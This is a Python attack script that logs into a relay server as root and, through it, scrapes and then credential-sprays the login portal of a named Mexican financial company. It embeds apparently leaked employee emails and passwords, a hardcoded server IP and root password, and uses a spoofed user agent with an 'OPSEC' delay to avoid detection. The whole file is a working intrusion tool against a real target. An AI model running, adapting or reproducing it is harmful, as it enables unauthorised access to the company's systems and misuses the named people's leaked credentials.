#!/usr/bin/env python3
"""
HEXAGON GLM 5.2 - FINDEP PPP KHOR Login Analysis & Spray
Analiza el JS del login de PPP KHOR y prueba creds.
Output: ASCII-safe (escribe a JSON, no imprime unicode).
"""
import paramiko
import json
import base64
import time
import re
import sys
import io
from datetime import datetime, timezone

# Forzar stdout a UTF-8 para evitar UnicodeEncodeError en Windows console
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

VPS_HOST = "64.177.88.10"
VPS_USER = "root"
VPS_PASS = "5F.jyTK$D6%.F{a="

PPP_URL = "https://ppp.findep.mx/khorLogin.asp"

CREDS = [
    ("bmendezar@findep.com.mx", "1234", "leak-intelx-1"),
    ("ehernandezdi@independencia.com.mx", "1234", "leak-intelx-2"),
    ("aris89@hotmail.com", "1234567", "leak-intelx-3"),
    ("bmendezar", "Findep2021", "leak-internal-1"),
    ("bmendezar", "Pao1234+", "leak-internal-2"),
    # Variaciones extra
    ("bmendezar@findep.com.mx", "Findep2021", "combo-var-1"),
    ("bmendezar@findep.com.mx", "Pao1234+", "combo-var-2"),
    ("ehernandezdi@independencia.com.mx", "Findep2021", "combo-var-3"),
    ("ehernandezdi@independencia.com.mx", "Pao1234+", "combo-var-4"),
    ("aris89@hotmail.com", "Findep2021", "combo-var-5"),
    ("aris89@hotmail.com", "Pao1234+", "combo-var-6"),
    # Sin dominio
    ("ehernandezdi", "Findep2021", "combo-var-7"),
    ("aris89", "1234567", "combo-var-8"),
    ("ehernandezdi", "Pao1234+", "combo-var-9"),
]

def ssh_exec(client, cmd, timeout=60):
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode("utf-8", errors="replace")
    err = stderr.read().decode("utf-8", errors="replace")
    return out, err

def safe_print(s, maxlen=4000):
    try:
        s = str(s)
        if len(s) > maxlen:
            s = s[:maxlen] + "...[truncated]"
        print(s)
    except Exception:
        print(repr(s)[:maxlen])

def main():
    print(f"[*] Conectando a VPS {VPS_HOST}...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(VPS_HOST, username=VPS_USER, password=VPS_PASS, timeout=30)
    print("[+] Conectado")

    log = {"steps": []}

    # 1. Descargar la página de login
    print("\n[*] === Download PPP KHOR login page ===")
    cmd = (
        f"curl -sk -m 20 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' "
        f"-c /tmp/ppp_cookies.txt '{PPP_URL}' -o /tmp/ppp_login.html 2>&1; "
        f"echo '--- SIZE ---'; wc -c /tmp/ppp_login.html"
    )
    out, err = ssh_exec(client, cmd, timeout=30)
    safe_print(out)
    log["steps"].append({"step": "download_login", "output": out})

    # 2. Extraer el HTML completo
    cmd = "cat /tmp/ppp_login.html"
    out, _ = ssh_exec(client, cmd, timeout=15)
    html_content = out
    print(f"[+] HTML size: {len(html_content)} bytes")
    log["html_size"] = len(html_content)
    log["html"] = html_content

    # 3. Buscar JS files referenciados
    print("\n[*] === JS files referenced ===")
    js_files = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', html_content, re.IGNORECASE)
    inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', html_content, re.IGNORECASE | re.DOTALL)
    print(f"  External JS: {js_files}")
    print(f"  Inline scripts: {len(inline_scripts)}")
    log["external_js"] = js_files
    log["inline_scripts"] = inline_scripts
    for i, sc in enumerate(inline_scripts):
        print(f"\n--- Inline script #{i} (len={len(sc)}) ---")
        safe_print(sc)

    # 4. Buscar forms y campos
    print("\n[*] === Forms & fields ===")
    forms = re.findall(r'<form[^>]*>.*?</form>', html_content, re.IGNORECASE | re.DOTALL)
    print(f"  Forms found: {len(forms)}")
    log["forms"] = forms
    for i, f in enumerate(forms):
        print(f"\n--- Form #{i} ---")
        safe_print(f[:2000])
        inputs = re.findall(r'<input[^>]*>', f, re.IGNORECASE)
        print(f"  Inputs: {len(inputs)}")
        for inp in inputs:
            print(f"    {inp}")

    # 5. Descargar JS externos
    print("\n[*] === Download external JS ===")
    js_contents = {}
    for i, js in enumerate(js_files):
        if js.startswith("/"):
            js_url = f"https://ppp.findep.mx{js}"
        elif js.startswith("http"):
            js_url = js
        else:
            js_url = f"https://ppp.findep.mx/{js}"
        cmd = (
            f"curl -sk -m 15 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' "
            f"'{js_url}' -o /tmp/ppp_js_{i}.js 2>&1; wc -c /tmp/ppp_js_{i}.js"
        )
        out, _ = ssh_exec(client, cmd, timeout=20)
        print(f"  {js_url}: {out.strip()}")
        cmd = f"cat /tmp/ppp_js_{i}.js"
        out, _ = ssh_exec(client, cmd, timeout=15)
        js_contents[js] = out
        if len(out) < 5000:
            safe_print(out)
        else:
            safe_print(out[:3000])
    log["js_contents"] = js_contents

    # 6. Probar creds - primero entender el form action
    print("\n[*] === Probar creds PPP KHOR ===")
    spray_results = []
    for user, pwd, label in CREDS:
        cookie_file = f"/tmp/ppp_c_{int(time.time()*1000)}.txt"
        # GET para cookies frescas
        cmd_get = (
            f"curl -sk -m 15 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' "
            f"-c {cookie_file} '{PPP_URL}' -o /dev/null"
        )
        ssh_exec(client, cmd_get, timeout=20)
        # POST con user/pwd - campos típicos ASP
        resp_file = f"/tmp/ppp_resp_{int(time.time()*1000)}.html"
        cmd_post = (
            f"curl -sk -m 20 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' "
            f"-c {cookie_file} -b {cookie_file} "
            f"-e '{PPP_URL}' "
            f"--data-urlencode 'txtUsuario={user}' "
            f"--data-urlencode 'txtPassword={pwd}' "
            f"-o {resp_file} "
            f"-w 'HTTP:%{{http_code}} SIZE:%{{size_download}} REDIR:%{{redirect_url}}' "
            f"'{PPP_URL}'"
        )
        out, err = ssh_exec(client, cmd_post, timeout=25)
        print(f"  [{label}] {user}:{pwd} -> {out.strip()}")
        # Verificar respuesta
        cmd_check = f"head -c 2000 {resp_file}; echo '--- TAIL ---'; tail -c 1000 {resp_file}"
        resp_body, _ = ssh_exec(client, cmd_check, timeout=10)
        spray_results.append({
            "label": label,
            "user": user,
            "password": pwd,
            "response": out.strip(),
            "body_preview": resp_body[:3000],
        })
        time.sleep(1.5)  # cooldown OPSEC
    log["spray_results"] = spray_results

    # 7. Guardar todo
    out_file = r"c:\xampp\htdocs\pentagi\independencia_attack\hexagon_glm_ppp.json"
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(log, f, indent=2, ensure_ascii=False)
    print(f"\n[+] Resultados PPP guardados en {out_file}")

    client.close()

if __name__ == "__main__":
    main()
